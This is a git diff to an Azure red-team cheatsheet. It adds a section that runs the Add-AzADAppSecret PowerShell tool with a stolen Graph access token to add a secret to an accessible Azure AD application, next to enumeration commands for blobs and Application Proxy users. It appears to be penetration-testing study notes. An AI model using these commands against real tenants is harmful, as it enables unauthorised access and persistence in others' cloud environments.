@@ -100,6 +100,7 @@ Get-AzKeyVault
     - [subdomains](https://github.com/conma293/Azure/blob/main/cheatsheet.md#subdomains)
     - [storage blobs](https://github.com/conma293/Azure/blob/main/cheatsheet.md#storage-blobs)
     - [Application Proxy - Users who can access](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-able-to-access-appproxy)
+  - [AzADAppSecret - add user to application we can access]
 - Web Application Exploitation
     - [Insecure WebApp FILE UPLOAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#web-application-file-upload)
     - [Server-Side Template Injection](https://github.com/conma293/Azure/blob/main/cheatsheet.md#server-side-template-injection)
@@ -462,7 +463,12 @@ Invoke-EnumerateAzureBlobs -Base defcorp
 . C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1 
 Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
 ```
-
+## AzADAppSecret 
+_Add user to Application we can access (probably as a managed identity)_
+```
+. C:\AzAD\Tools\Add-AzADAppSecret.ps1
+Add-AzADAppSecret -GraphToken $graphaccesstoken -Verbose
+```
 * * * 
 
 # Web Application File Upload
